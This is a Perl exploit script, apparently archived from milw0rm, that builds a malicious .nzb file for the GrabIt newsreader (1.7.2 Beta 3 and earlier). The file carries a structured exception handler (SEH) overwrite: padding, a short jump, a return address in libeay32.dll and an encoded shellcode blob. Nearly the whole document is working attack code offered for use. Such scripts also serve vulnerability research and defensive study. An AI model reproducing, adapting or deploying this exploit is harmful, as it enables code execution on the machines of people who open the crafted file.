#!/usr/bin/perl
# Grabit<=1.7.2 Beta 3 (.nzb) SEH Overwrite Exploit
# Coded by: Gaurav Baruah
# Discovery: Niels Teusink
#http://packetstormsecurity.org/filedesc/grabit-overflow.txt.html
# Greetz to Vivek
#Tested on XP SP3 and XP SP2 (en)
my $header1=
"<?xml version=\"1.0\"?>
<!DOCTYPE nzb
  PUBLIC \"-//newzBin//DTD NZB 1.0//EN\"
         \"";

my $shellcode=
"\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe8".
"\x61\xfb\x36\x83\xeb\xfc\xe2\xf4\x14\x89\xbf\x36\xe8\x61\x70\x73".
"\xd4\xea\x87\x33\x90\x60\x14\xbd\xa7\x79\x70\x69\xc8\x60\x10\x7f".
"\x63\x55\x70\x37\x06\x50\x3b\xaf\x44\xe5\x3b\x42\xef\xa0\x31\x3b".
"\xe9\xa3\x10\xc2\xd3\x35\xdf\x32\x9d\x84\x70\x69\xcc\x60\x10\x50".
"\x63\x6d\xb0\xbd\xb7\x7d\xfa\xdd\x63\x7d\x70\x37\x03\xe8\xa7\x12".
"\xec\xa2\xca\xf6\x8c\xea\xbb\x06\x6d\xa1\x83\x3a\x63\x21\xf7\xbd".
"\x98\x7d\x56\xbd\x80\x69\x10\x3f\x63\xe1\x4b\x36\xe8\x61\x70\x5e".
"\xd4\x3e\xca\xc0\x88\x37\x72\xce\x6b\xa1\x80\x66\x80\x91\x71\x32".
"\xb7\x09\x63\xc8\x62\x6f\xac\xc9\x0f\x02\x9a\x5a\x8b\x61\xfb\x36";

my $next_seh = "\xEB\x06\x90\x90";
my $seh = "\xE5\x56\x01\x10" ;   #libeay32.dll
my $file = "test.nzb";

open (nzb, ">./$file") || die "\nCan't open $file: $!";
print nzb "$header1" . "\x41" x 248 . "$next_seh" . "$seh" . "$shellcode";
close (nzb);
sleep 1;
print "\nFile $file successfully created!\n";

# milw0rm.com [2009-05-05]